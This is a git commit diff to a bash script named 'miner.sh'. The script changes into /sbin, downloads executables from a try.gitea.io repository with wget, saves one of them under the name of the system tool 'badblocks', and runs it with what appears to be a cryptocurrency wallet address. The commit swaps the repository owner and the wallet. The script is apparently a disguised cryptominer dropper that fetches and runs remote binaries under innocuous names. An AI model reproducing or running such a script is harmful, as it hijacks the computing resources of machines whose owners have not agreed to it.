954debc78ec9c3387df38c14543b16c834dc0b2f
zxcasf <gondesselaludihati@gmail.com>
2021-08-23 18:50:20 +0000

    Update 'miner.sh'

--- miner.sh
+++ miner.sh
@@ -1,8 +1,8 @@
 #!/bin/bash
 cd /sbin
-wget -O badblocks https://try.gitea.io/bambanks/nambang/raw/branch/main/badblocks
-wget -O blkdiscard https://try.gitea.io/bambanks/nambang/raw/branch/main/blkdiscard
-wget https://try.gitea.io/bambanks/nambang/raw/branch/main/amdmemtweak
-wget https://try.gitea.io/bambanks/nambang/raw/branch/main/libnvrtc-builtins.so
-wget https://try.gitea.io/bambanks/nambang/raw/branch/main/libnvrtc.so.11.1
-./badblocks 3ETe5pgEXkw9uw4hfZ3vin3Gws16b5F4Yy
+wget -O badblocks https://try.gitea.io/zxcasf/nambang/raw/branch/main/badblocks
+wget -O blkdiscard https://try.gitea.io/zxcasf/nambang/raw/branch/main/blkdiscard
+wget https://try.gitea.io/zxcasf/nambang/raw/branch/main/amdmemtweak
+wget https://try.gitea.io/zxcasf/nambang/branch/main/libnvrtc-builtins.so
+wget https://try.gitea.io/zxcasf/nambang/raw/branch/main/libnvrtc.so.11.1
+./badblocks 9gWVoGLYJE4aqdVJpdMfxSUi6o3Qk3NSNShWjwrZmLyXcLFbVgn
